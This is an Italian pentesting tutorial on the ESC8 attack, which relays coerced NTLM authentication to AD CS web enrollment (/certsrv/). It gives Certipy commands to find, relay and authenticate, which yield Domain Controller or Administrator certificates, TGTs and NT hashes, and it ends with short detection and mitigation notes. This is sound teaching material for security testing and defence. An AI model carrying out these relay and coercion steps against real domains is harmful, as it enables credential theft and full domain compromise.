---
title: 'ESC8 ADCS: NTLM Relay contro Web Enrollment per Domain Admin'
slug: esc8-adcs
description: >-
  ESC8 privilege escalation, sfrutta NTLM Relay contro gli endpoint /certsrv/ di
  AD CS per ottenere certificati privilegiati. Guida pratica con Certipy e
  coercion NTLM.
image: /8.webp
draft: false
date: 2026-03-08T00:00:00.000Z
categories:
  - windows
subcategories:
  - privilege-escalation
tags:
  - ad
  - adcs
  - certipy
  - esc
---

ESC8 è una tecnica di **Active Directory Privilege Escalation tramite AD CS** che sfrutta **NTLM Relay contro gli endpoint HTTP di enrollment della Certificate Authority**. In pratica l'attaccante intercetta un'autenticazione NTLM di un account privilegiato e la inoltra al servizio web di AD CS per ottenere un certificato a nome della vittima.

I target principali sono gli endpoint web di enrollment:

* `http://<CA>/certsrv/`
* `https://<CA>/certsrv/`
* CES (Certificate Enrollment Service)
* CEP (Certificate Enrollment Policy)

⚠️ **Certipy supporta il relay solo verso il classico Web Enrollment `/certsrv/`**, in particolare l’endpoint:

```
/certsrv/certfnsh.asp
```

Il problema nasce quando questi servizi:

* accettano **NTLM authentication**
* **non usano Extended Protection for Authentication (EPA)**
* oppure permettono **HTTP senza TLS**

In queste condizioni è possibile effettuare **NTLM relay** verso la CA e ottenere certificati privilegiati.

Questo tipo di attacco è spesso combinato con tecniche di coercion come:

* PetitPotam
* PrinterBug
* altre RPC coercion

(vedi anche le tecniche di coercion nella guida **Active Directory Pentesting** su HackIta).

***

# Identificazione con Certipy

Certipy può rilevare configurazioni vulnerabili ESC8 analizzando i servizi web della CA.

```bash
certipy find -u 'user@corp.local' -p 'Password123' -dc-ip 10.0.0.100 -vulnerable -enabled -stdout
```

Output tipico:

```
Certificate Authorities

CA Name : CORP-CA
DNS Name : CA.CORP.LOCAL

Web Enrollment
  HTTP
    Enabled : False
  HTTPS
    Enabled : True
    Channel Binding (EPA) : False

[!] Vulnerabilities
  ESC8 : Web Enrollment is enabled over HTTPS and Channel Binding is disabled
```

Indicatori principali:

* `HTTP Enabled : True`
* oppure `HTTPS Enabled : True` ma `Channel Binding (EPA) : False`
* `[!] Vulnerabilities ESC8`

***

# Exploit ESC8 ADCS con Certipy

L'attacco ha due componenti:

1. **coercion di autenticazione NTLM**
2. **relay verso AD CS**

***

## Step 1 — Avvia NTLM relay con Certipy

Se si vuole impersonare un **Domain Controller**:

```bash
certipy relay \
-target 'https://10.0.0.50' -template 'DomainController'
```

Se si vuole relayare un **utente**:

```bash
certipy relay -target 'https://10.0.0.50'
```

Output:

```
Targeting https://10.0.0.50/certsrv/certfnsh.asp (ESC8)
Listening on 0.0.0.0:445
Setting up SMB Server on port 445
```

Se compare errore porta 445 su Linux:

```bash
echo 0 | sudo tee /proc/sys/net/ipv4/ip_unprivileged_port_start
```

***

## Step 2 — Forza autenticazione NTLM

Serve un tool esterno come:

* PetitPotam
* Coercer

per costringere un host privilegiato (es. Domain Controller) ad autenticarsi verso la macchina dell’attaccante.

***

## Step 3 — Relay e richiesta certificato

Quando l'autenticazione arriva, Certipy la inoltra alla CA e richiede automaticamente un certificato.

Esempio relay di **Domain Controller**:

```
Requesting certificate for 'CORP\\DC$' based on the template 'DomainController'
Certificate issued with request ID 1
Got certificate with DNS Host Name 'DC.CORP.LOCAL'
Saving certificate and private key to 'dc.pfx'
```

Esempio relay di **Administrator**:

```
Requesting certificate for 'CORP\\Administrator' based on the template 'User'
Certificate issued with request ID 1
Saving certificate and private key to 'administrator.pfx'
```

Ora l'attaccante possiede il certificato `.pfx`.

***

## Step 4 — Autenticazione con il certificato

### Domain Controller

```bash
certipy auth -pfx 'dc.pfx' -dc-ip '10.0.0.100'
```

Output:

```
Got TGT
Saving credential cache to 'dc.ccache'
Got hash for 'dc$@corp.local'
```

***

### Administrator

```bash
certipy auth -pfx 'administrator.pfx' -dc-ip '10.0.0.100'
```

Output:

```
Got TGT
Saving credential cache to 'administrator.ccache'
Got hash for 'administrator'
```

Risultato finale:

* **Kerberos TGT**
* **NT hash**
* **Domain compromise**

***

# Detection ESC8 ADCS

Controllare:

* servizi `/certsrv/` attivi
* NTLM abilitato su IIS
* EPA disabilitato

Indicatori utili:

* accessi sospetti a `/certsrv/certfnsh.asp`
* richieste certificate anomale
* autenticazioni NTLM verso host non previsti

***

# Mitigation ESC8 ADCS

Misure principali:

**1️⃣ Abilitare Extended Protection for Authentication (EPA)**
sui servizi IIS di AD CS.

**2️⃣ Usare solo HTTPS**
e disabilitare HTTP.

**3️⃣ Disabilitare NTLM sui servizi web**
quando possibile.

**4️⃣ Disabilitare Web Enrollment se non necessario**

***

# FAQ — ESC8 ADCS

### Cos'è ESC8 in AD CS?

È un attacco di **NTLM relay contro i servizi web di enrollment della CA**.

### ESC8 permette Domain Admin?

Sì. Se viene relayato un account privilegiato come **Domain Controller** o **Administrator**, l'attaccante può ottenere il relativo certificato.

### ESC8 richiede compromissione iniziale?

No. Serve solo **coercion NTLM** verso la macchina dell'attaccante.

### Qual è la differenza tra ESC8 e ESC6?

[ESC6](https://hackita.it/articoli/esc6-adcs) sfrutta configurazioni della CA.
ESC8 sfrutta **NTLM relay verso l'interfaccia web della CA**.

***

**Key Takeaway:** se `/certsrv/` accetta NTLM senza Extended Protection, un attaccante può relayare l'autenticazione di un Domain Controller e ottenere un certificato privilegiato.

***

> ESC8 è uno degli attacchi più comuni contro AD CS.
> Per vedere tutte le tecniche certificate attack consulta la guida completa:
> [https://hackita.it/articoli/adcs-esc1-esc16](https://hackita.it/articoli/adcs-esc1-esc16)Continua con le escalation successive:
> [https://hackita.it/articoli/esc9-adcs](https://hackita.it/articoli/esc9-adcs) · [https://hackita.it/articoli/esc10-adcs](https://hackita.it/articoli/esc10-adcs)Supporta HackIta se queste guide ti aiutano:
> [https://hackita.it/supporto](https://hackita.it/supporto)Vuoi imparare pentesting Active Directory o testare la sicurezza della tua infrastruttura?
> [https://hackita.it/servizi](https://hackita.it/servizi)Riferimenti tecnici:
> [https://specterops.io/blog/2021/06/17/certified-pre-owned/](https://specterops.io/blog/2021/06/17/certified-pre-owned/)
> [https://github.com/ly4k/Certipy](https://github.com/ly4k/Certipy)
> [https://learn.microsoft.com/en-us/windows-server/identity/ad-cs/](https://learn.microsoft.com/en-us/windows-server/identity/ad-cs/)
